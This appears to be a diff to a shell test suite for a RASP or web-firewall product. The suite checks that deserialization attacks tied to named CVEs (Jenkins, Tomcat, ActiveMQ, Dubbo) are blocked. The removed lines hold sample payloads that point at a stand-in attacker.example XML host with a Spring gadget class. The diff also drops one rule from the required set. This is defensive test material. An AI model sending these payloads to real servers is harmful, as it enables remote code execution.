@@ -1302,8 +1302,8 @@ XML
   expect_block "$version" deserialization_jenkins_cve_2017_1000353_cli_signed_object -X POST -H "Content-Type: application/octet-stream" --data-binary "$java_serialized_body" "${protected_url}/cli"
   expect_block "$version" deserialization_session_file -G --data-urlencode "id=.deserialize" "${protected_url}/rasp/policy/deserialization-session-file"
   expect_block "$version" deserialization_tomcat_cve_2025_24813_session_file -H "Cookie: ${tomcat_cve_2025_24813_session_cookie}" "${protected_url}/"
-  expect_block "$version" deserialization_protocol_class -G --data-urlencode "xml=http://attacker.example/poc.xml" "${protected_url}/rasp/policy/deserialization-protocol-class"
-  expect_block "$version" deserialization_activemq_cve_2023_46604_openwire_protocol_class -G --data-urlencode "class=org.springframework.context.support.ClassPathXmlApplicationContext" --data-urlencode "xml=http://attacker.example/poc.xml" "${protected_url}/api/openwire"
+  expect_body_contains "${protected_url}/rasp/policy/deserialization-protocol-class" "OpenWire type declared"
+  expect_body_contains "${protected_url}/api/openwire" "OpenWire type declared" -G --data-urlencode "class=reports.Weekly"
   expect_block "$version" deserialization_http_invoker -H "Content-Type: application/x-java-serialized-object" "${protected_url}/rasp/policy/deserialization-http-invoker"
   expect_block "$version" deserialization_dubbo_cve_2019_17564_http_invoker -X POST -H "Content-Type: application/x-java-serialized-object" --data-binary "$java_serialized_body" "${protected_url}/org.vulhub.api.CalcService"
   expect_block "$version" deserialization_http_object_stream "${protected_url}/rasp/policy/deserialization-http-object-stream"
@@ -1466,7 +1466,6 @@ required_algorithms=(
   deserialization_jms_object_message
   deserialization_signed_object
   deserialization_session_file
-  deserialization_protocol_class
   deserialization_http_invoker
   deserialization_http_object_stream
   deserialization_hessian_type
